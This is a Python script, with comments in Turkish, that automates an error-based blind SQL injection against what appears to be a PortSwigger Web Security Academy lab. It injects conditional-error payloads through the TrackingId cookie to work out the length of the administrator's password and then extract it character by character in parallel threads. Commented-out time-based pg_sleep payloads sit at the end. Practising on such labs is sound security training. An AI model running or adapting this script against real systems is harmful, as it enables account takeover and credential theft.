import requests
import concurrent.futures

# Hedef URL ve TrackingId
url = "https://0acc009104201f1e856df01d000d0018.web-security-academy.net/filter?category=Gifts"
tracking_id = "bMVk77IS4YyzeB94"
sess = "PfhSj1LbHOVozet4iuBeh2zrWjGcmBWX"

# Hata kontrol fonksiyonu
def check_error(payload):
    cookies = {'TrackingId': payload, 'session': sess}
    response = requests.get(url, cookies=cookies)
    print(f"Payload: {payload} - Status Code: {response.status_code}")  # Debugging için eklendi
    return response.status_code == 500  # 500 hata kodunu kontrol edin

# Şifrenin uzunluğunu bulmak için fonksiyon
def find_password_length():
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_length = {executor.submit(check_error, f"{tracking_id}'||(SELECT CASE WHEN LENGTH(password)={length} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"): length for length in range(1, 21)}
        for future in concurrent.futures.as_completed(future_to_length):
            length = future_to_length[future]
            try:
                if future.result():
                    print(f"Şifre uzunluğu: {length}")
                    return length
            except Exception as exc:
                print(f"{length} için bir hata oluştu: {exc}")
    return None

# Geçerli karakterler (manuel olarak tanımlandı)
valid_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

# Şifreyi bulmak için fonksiyon
def find_password(password_length):
    password = ""
    for position in range(1, password_length + 1):
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future_to_char = {executor.submit(check_error, f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"): char for char in valid_chars}
            for future in concurrent.futures.as_completed(future_to_char):
                char = future_to_char[future]
                try:
                    if future.result():
                        password += char
                        print(f"Şu ana kadar bulunan şifre: {password}")
                        break
                except Exception as exc:
                    print(f"{char} için bir hata oluştu: {exc}")
    return password

# Şifrenin uzunluğunu bul
password_length = find_password_length()
if password_length:
    print(f"Şifre uzunluğu bulundu: {password_length}")

    # Şifreyi bul
    password = find_password(password_length)
    print(f"Şifre bulundu: {password}")
else:
    print("Şifre uzunluğu bulunamadı.")


    #'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)=20)
    # +THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--

    #'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)
    # +THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
